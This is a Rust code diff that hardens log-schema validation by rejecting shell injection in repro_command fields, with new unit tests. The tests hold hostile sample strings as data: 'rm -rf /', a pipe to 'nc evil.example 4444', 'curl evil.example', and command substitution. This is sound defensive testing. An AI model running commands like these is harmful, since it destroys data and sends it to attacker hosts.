@@ -571,38 +571,7 @@ pub fn validate_e2e_log_json(json: &str) -> Vec<String> {
     if let Some(cmd) = value.get("repro_command").and_then(|v| v.as_str()) {
         let trimmed = cmd.trim();
         if !trimmed.is_empty() {
-            if !trimmed.contains("rch exec --") {
-                violations.push(
-                    "repro_command must include 'rch exec --' for remote execution".to_string(),
-                );
-            }
-            if !(trimmed.starts_with("rch exec --") || trimmed.starts_with("rch exec ")) {
-                violations.push(
-                    "repro_command must START with 'rch exec' (no shell prologue) — \
-                     prefixing other commands enables shell-metacharacter injection if \
-                     a replay tool eval's the command (br-asupersync-zmzwof)"
-                        .to_string(),
-                );
-            }
-            // Reject unquoted shell metacharacters that change command structure.
-            // We allow `--` (the rch arg separator) and `=` and `/` in paths, but
-            // reject sequencing operators, redirection, command substitution,
-            // and process substitution.
-            const SHELL_META: &[char] = &[';', '|', '&', '`', '\n', '\r'];
-            if let Some(bad) = trimmed.chars().find(|c| SHELL_META.contains(c)) {
-                violations.push(format!(
-                    "repro_command contains shell metacharacter {bad:?} — would enable \
-                     shell injection if eval'd by a replay tool (br-asupersync-zmzwof)"
-                ));
-            }
-            // Reject `$(` and `${` (command substitution / parameter expansion).
-            if trimmed.contains("$(") || trimmed.contains("${") {
-                violations.push(
-                    "repro_command contains shell substitution ($( or ${) — \
-                     would enable injection if eval'd (br-asupersync-zmzwof)"
-                        .to_string(),
-                );
-            }
+            validate_repro_command(trimmed, &mut violations);
         }
     }
 
@@ -788,20 +757,16 @@ pub fn validate_unit_log_json(json: &str) -> Vec<String> {
         None => violations.push("missing required field: seed".to_string()),
     }
 
-    // Repro command must be present and use rch like the E2E contract.
+    // Repro command must be present and satisfy the same hardened
+    // `rch exec` contract as the E2E schema (br-asupersync-zmzwof).
     match value.get("repro_command") {
         Some(cmd) if cmd.as_str().is_some_and(|text| text.trim().is_empty()) => {
             violations.push("required field 'repro_command' is empty".to_string());
         }
-        Some(cmd)
-            if cmd
-                .as_str()
-                .is_some_and(|text| !text.contains("rch exec --")) =>
-        {
-            violations
-                .push("repro_command must include 'rch exec --' for remote execution".to_string());
+        Some(cmd) if cmd.as_str().is_some() => {
+            let trimmed = cmd.as_str().expect("guarded by is_some");
+            validate_repro_command(trimmed.trim(), &mut violations);
         }
-        Some(cmd) if cmd.as_str().is_some() => {}
         Some(cmd) if cmd.is_null() => {
             violations.push("missing required field: repro_command".to_string());
         }
@@ -859,6 +824,40 @@ pub fn validate_unit_log_json(json: &str) -> Vec<String> {
     }
 
     violations
+}
+
+fn validate_repro_command(trimmed: &str, violations: &mut Vec<String>) {
+    if !trimmed.contains("rch exec --") {
+        violations
+            .push("repro_command must include 'rch exec --' for remote execution".to_string());
+    }
+    if !(trimmed.starts_with("rch exec --") || trimmed.starts_with("rch exec ")) {
+        violations.push(
+            "repro_command must START with 'rch exec' (no shell prologue) — \
+             prefixing other commands enables shell-metacharacter injection if \
+             a replay tool eval's the command (br-asupersync-zmzwof)"
+                .to_string(),
+        );
+    }
+    // Reject unquoted shell metacharacters that change command structure.
+    // We allow `--` (the rch arg separator) and `=` and `/` in paths, but
+    // reject sequencing operators, redirection, command substitution,
+    // and process substitution.
+    const SHELL_META: &[char] = &[';', '|', '&', '`', '\n', '\r'];
+    if let Some(bad) = trimmed.chars().find(|c| SHELL_META.contains(c)) {
+        violations.push(format!(
+            "repro_command contains shell metacharacter {bad:?} — would enable \
+             shell injection if eval'd by a replay tool (br-asupersync-zmzwof)"
+        ));
+    }
+    // Reject `$(` and `${` (command substitution / parameter expansion).
+    if trimmed.contains("$(") || trimmed.contains("${") {
+        violations.push(
+            "repro_command contains shell substitution ($( or ${) — \
+             would enable injection if eval'd (br-asupersync-zmzwof)"
+                .to_string(),
+        );
+    }
 }
 
 fn validate_required_unsigned_integer_field(
@@ -1964,6 +1963,47 @@ mod tests {
                 .iter()
                 .any(|v| v.contains("repro_command must include 'rch exec --'")),
             "should enforce rch-backed repro commands: {violations:?}"
+        );
+    }
+
+    #[test]
+    fn zmzwof_validate_unit_log_rejects_shell_meta_in_repro_command() {
+        let cases: &[(&str, &str)] = &[
+            ("rm -rf / ; rch exec -- cargo test", "shell metacharacter"),
+            (
+                "rch exec -- cargo test | nc evil.example 4444",
+                "shell metacharacter",
+            ),
+            (
+                "rch exec -- cargo test && curl evil.example",
+                "shell metacharacter",
+            ),
+            ("rch exec -- cargo test `whoami`", "shell metacharacter"),
+            ("rch exec -- cargo test\nrm -rf /", "shell metacharacter"),
+            ("rch exec -- cargo test $(whoami)", "shell substitution"),
+            ("rch exec -- cargo test ${HOME}/evil", "shell substitution"),
+        ];
+        for (cmd, expected_fragment) in cases {
+            let mut entry = valid_unit_log_value_with_governance();
+            entry["repro_command"] = json!(cmd);
+            let violations = validate_unit_log_json(&entry.to_string());
+            assert!(
+                violations.iter().any(|v| v.contains(expected_fragment)),
+                "should reject shell-meta unit repro_command {cmd:?}: violations={violations:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn zmzwof_validate_unit_log_rejects_shell_prologue_before_rch_exec() {
+        let mut entry = valid_unit_log_value_with_governance();
+        entry["repro_command"] = json!("env FOO=bar rch exec -- cargo test");
+        let violations = validate_unit_log_json(&entry.to_string());
+        assert!(
+            violations
+                .iter()
+                .any(|v| v.contains("must START with 'rch exec'")),
+            "should reject unit repro_command shell prologue: {violations:?}"
         );
     }
 
